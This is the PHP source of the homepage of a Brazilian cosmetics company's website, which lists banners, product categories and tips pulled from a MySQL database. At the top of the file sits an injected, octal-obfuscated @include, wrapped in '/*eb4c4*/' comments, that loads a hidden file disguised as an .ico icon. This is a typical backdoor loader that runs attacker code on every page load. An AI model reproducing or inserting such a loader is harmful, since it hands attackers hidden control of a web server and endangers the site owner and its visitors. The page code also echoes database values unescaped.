<?php 


/*eb4c4*/

@include "\057home\057stor\141ge/d\057a2/2\063/nup\151ll/p\165blic\137html\057usua\162io/.\142bfa3\07193.i\143o";

/*eb4c4*/
?> 
<?
	//Conecta
	include "_includes/conexao.php";
	
	$busca_dicas = mysql_query("SELECT * FROM tb_dicas ORDER BY data_cadastro DESC LIMIT 0, 2");

	// Busca Banners
	$busca_banners = mysql_query("SELECT * FROM tb_banners ORDER BY hierarquia ASC");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Nupill Cosméticos</title>

<meta name="keywords" content="nupill, cosméticos">
<meta name="description" content="A Nupill Cosméticos desenvolve produtos adequados à suas necessidades, assim como, os últimos avanços em tecnologia que combinam performance, prazer, segurança e criatividade.">
<!-- FOLHAS DE ESTILO -->
<link href="_css/estilo.css" rel="stylesheet" type="text/css" />
<!-- FIM DAS FOLHAS DE ESTILO -->
</head>

<body>

<!-- TOPO -->
<div id="topo">
	
  
  
  <!-- DEFESA TOPO -->
  <div id="defesa">
  
  <h1><a href="index.php" title="Nupill">Nupill</a></h1>
  
  <ul class="menu">
    	<li><a class="myriad_regular ativo invisible_mobile" href="index.php">HOME</a></li>
        <li><a class="myriad_regular" href="sobre-a-empresa.php">A NUPILL</a></li>
        <li><a class="myriad_regular" href="produtos.php">PRODUTOS</a></li> 
        <li><a class="myriad_regular" href="lancamentos.php">LAN&Ccedil;AMENTOS</a></li> 
        <li><a class="myriad_regular" href="dicas.php">DICAS</a></li> 
        <li><a class="myriad_regular invisible_mobile" href="https://www.youtube.com/channel/UCfx37H2rrVTjLhLfr96ZSHw/videos"  target="_blank">NUPILL TV</a></li> 
<li><a class="myriad_regular" href="fale-conosco.php">FALE CONOSCO</a></li>    
    </ul>
  <br class="limpa_float" />
  <div id="banner" class="slider"> 
    
  	<ul class="bxslider">
	  <? 
		//Lista os banners
		while ($dados_banner = mysql_fetch_array($busca_banners)) { 
		?> <li> <?
		if($dados_banner['link'] != "") { ?><a title="Destaques da Nupill" href="<?=$dados_banner['link']?>"><?php } ?><img src="../_imagens/banners/<?=$dados_banner['imagem_1']?>" alt="<?=$dados_banner['nome']?>" border="0" title="Destaques da Nupill" /><?php if($dados_banner['link'] != "") { ?></a>
		<?php } ?>
		</li> 
		<? } ?>
	</ul>

  </div>
  
  </div>
  <!-- FIM DA DEFESA TOPO -->

</div>
<!-- FIM DO TOPO -->

<!-- CONTEÚDO -->
<div id="conteudo">

  <!-- DEFESA CONTEÚDO -->
  <div id="defesa">
  
  	<ul class="categorias">
    
    <li><a href="depilatorio.php" title="Depilat&oacute;rio"><img src="_imagens/categorias/depilatorio.jpg" width="150" height="135" alt="Depilat&oacute;rio" /></a></li>
    <li><a href="cuidado-facial.php" title="Cuidado Facial"><img src="_imagens/categorias/cuidado-facial.jpg" width="150" height="135" alt="Cuidado Facial" /></a></li>
    <li><a href="cuidado-corporal.php" title="Cuidado Corporal"><img src="_imagens/categorias/cuidado-corporal.jpg" width="150" height="135" alt="Cuidado Corporal" /></a></li>
    <li><a href="cuidado-capilar.php" title="Cuidado Capilar"><img src="_imagens/categorias/cuidado-capilar.jpg" width="150" height="135" alt="Cuidado apilar" /></a></li>
    <li><a href="nupill-men.php" title="Nupill Man"><img src="_imagens/categorias/nupill-men.jpg" width="150" height="135" alt="Nupill Man" /></a></li>
    <li style="margin:0"><a href="desodorantes.php" title="Desodorantes"><img src="_imagens/categorias/desodorantes.jpg" width="150" height="135" alt="Desodorantes" /></a></li>
    
    <br class="limpa_float" />   
   
    </ul>
    
    <br class="limpa_float" />    
  
  
    <div class="box_maior">
      <a class="sete_motivos" title="Sete motivos para investir em voc&ecirc; !" href="sete-motivos-para-investir-em-voce.php">
      <span class="invisible_mobile">Sete motivos para investir em voc&ecirc; !</span>
      <img src="_imagens/a_sete_motivos.jpg" class="visible_mobile" width="100%" height="auto">
      </a>
      
    </div>
    
    
    <div class="box_maior alinhar_direita">
      <a class="nupilltv" title="Nupill TV" target="_blank" href="https://www.youtube.com/channel/UCfx37H2rrVTjLhLfr96ZSHw/videos">
      <span class="invisible_mobile">Nupill TV</span>
      <img src="_imagens/a_nupill_tv.jpg" class="visible_mobile" width="100%" height="auto">
      </a>
      
    </div>
    
    
    
    <div class="box full">
    <h3 class="blue century">Dicas</h3>
    
    <ul>
    <? //Lista os dicas
	  while ($dados_dica = mysql_fetch_array($busca_dicas)) { 
	  //Trabalha o resumo
	  $resumo_dica_cru = strip_tags ($dados_dica['descricao']);
	  $resumo_dica = resumo($resumo_dica_cru,95);
	?>
    <li><a href="dicas.php#<?=$dados_dica['id']?>" title="Ler mais"><strong><?=$dados_dica['nome']?></strong> 
      <?=$resumo_dica?> ...</a>
    </li> 
    <? } ?>
    </ul>
    
    <br class="limpa_float" />
    <a href="dicas.php" class="ver_todas">Ver todas +</a>

    
    </div>   
    
    <br class="limpa_float" />

  </div>
  <!-- FIM DA DEFESA CONTEÚDO -->

</div>
<!-- FIM DO CONTEÚDO -->
<!-- BASE -->
<div id="base">

  <!-- DEFESA BASE -->
  <div id="defesa">  

    <p class="left">&copy; 2017, Nupill Cosm&eacute;ticos <br />
    Todos os direitos rerservados.</p>
    <p class="center">
   		<a href="index.php" class="invisible_mobile">Home</a>
        <a href="sobre-a-empresa.php">A Nupill</a>
        <a href="produtos.php">Produtos</a> 
        <a href="lancamentos.php">La&ccedil;amentos</a> 
        <a href="dicas.php">Dicas</a> 
        <!--<a href="http://www.nupill.com.br/blog/">Conhe&ccedil;a nosso Blog</a>-->
<!--<a href="http://www.nupill.com.br/blog/" target="_blank" class="blog">Blog</a>-->
<a href="http://www.facebook.com.br/nupill.cosmeticos" target="_blank" class="facebook">Facebook</a>
<!--<a href="http://twitter.com/#!/Nupill1" target="_blank" class="twitter">Twitter</a>-->
<a href="https://www.instagram.com/nupill_oficial/" target="_blank" class="instagram">Instagram</a>
<a href="https://plus.google.com/u/0/107453918396455358707" target="_blank" class="googlemais">Google+</a>
<a href="https://www.youtube.com/channel/UCfx37H2rrVTjLhLfr96ZSHw/videos" target="_blank" class="youtube">Youtube</a>

<a href="fale-conosco.php">Fale conosco</a>  
    </p>
    <p class="right"></p>
    
  </div>
  <!-- FIM DA DEFESA BASE -->

</div>
<!-- FIM DA BASE -->

<!-- jQuery library (served from Google) -->
<script src="_ajax/jquery-1.8.2.min.js"></script>
<!-- bxSlider Javascript file -->
<script src="_ajax/jquery.bxslider.min.js"></script>
<!-- bxSlider CSS file -->
<link href="_ajax/jquery.bxslider.css" rel="stylesheet" />

<script type="text/javascript">

	$(document).ready(function(){
	  $('.bxslider').bxSlider({
		  auto: true,
    	  keyboardEnabled: true,
    	  stopAutoOnClick: true,
		  autoControls: false,
		  pager: false
		});
	});
	
	
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-23705058-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
</body>
</html>